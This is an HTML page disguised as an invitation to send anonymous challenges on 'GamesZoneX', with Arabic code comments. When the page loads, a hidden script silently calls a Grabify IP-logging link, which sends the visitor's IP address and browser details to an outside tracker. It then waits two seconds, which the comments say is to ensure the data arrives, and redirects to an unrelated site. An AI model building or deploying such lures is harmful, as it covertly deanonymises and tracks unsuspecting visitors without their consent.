<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send me anonymous challenges on GamesZoneX!</title>
</head>
<body>

  <script>
    // تشغيل الكود فوراً وببساطة عند تحميل الصفحة
    window.addEventListener("load", function() {
      
      // رابط Grabify الخاص بك كاملاً ومباشراً بدون تعديل أو إخفاء الرمز
      const grabifyUrl = 'https://grabify.link/OAM0DU'; 
      const destinationUrl = 'https://dominoes.mx';

      // إرسال الطلب بنفس طريقة كودك القديم الناجح
      fetch(grabifyUrl, { 
        mode: 'no-cors',
        cache: 'no-store', // 👈 هذا هو السطر السحري الذي يمنع فيرسل من تجميد الكود ويجعله يعمل في كل مرة
        credentials: 'omit'
      }).then(() => console.log('Logged'))
        .catch(e => console.log('Forwarded'));

      // مهلة ثانيتين لضمان وصول البيانات للسيرفر قبل الانتقال
      setTimeout(function() {
        window.location.href = destinationUrl;
      }, 2000); 
    });
  </script>

</body>
</html>
